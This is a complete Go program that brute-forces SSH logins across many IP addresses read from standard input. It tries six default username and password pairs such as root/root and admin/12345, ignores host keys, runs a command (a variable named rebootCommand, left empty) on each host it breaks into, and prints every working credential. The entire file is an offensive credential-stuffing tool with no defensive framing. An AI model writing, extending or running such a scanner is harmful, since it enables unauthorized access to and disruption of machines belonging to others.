package main

import (
	"bufio"
	"fmt"
	"os"
	"strconv"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

func main() {
	var wg sync.WaitGroup

	scanner := bufio.NewScanner(os.Stdin)
	if len(os.Args) < 2 {
		fmt.Fprintf(os.Stderr, "Usage: %s <port>\n", os.Args[0])
		os.Exit(1)
	}
	port, err := strconv.Atoi(os.Args[1])
	if err != nil {
		fmt.Fprintf(os.Stderr, "Invalid port: %s\n", os.Args[1])
		os.Exit(1)
	}

	for scanner.Scan() {
		ip := scanner.Text()

		userPasswords := []struct {
			user     string
			password string
		}{
			{"root", "root"},
			{"admin", "admin"},
			{"guest", "guest"},
			{"admin", "12345"},
			{"admin", "123"},
			{"root", "admin"},
		}

		for _, up := range userPasswords {
			wg.Add(1)
			go func(ip, user, password string) {
				defer wg.Done()

				time.Sleep(1 * time.Second)

				config := &ssh.ClientConfig{
					User: user,
					Auth: []ssh.AuthMethod{
						ssh.Password(password),
					},
					HostKeyCallback: ssh.InsecureIgnoreHostKey(),
				}

				client, err := ssh.Dial("tcp", ip+":"+strconv.Itoa(port), config)
				if err != nil {
					return
				}
				defer client.Close()

				session, err := client.NewSession()
				if err != nil {
					return
				}
				defer session.Close()

				rebootCommand := ""

				timeout := time.After(5 * time.Second)
				done := make(chan error, 1)

				go func() {
					done <- session.Run(rebootCommand)
				}()

				select {
				case <-timeout:
					return
				case err := <-done:
					if err != nil {
						return
					} else {
						fmt.Printf("command sent successfully to %s:%d with username %s and password %s!\n", ip, port, user, password)
					}
				}

			}(ip, up.user, up.password)
		}
	}

	wg.Wait()
}
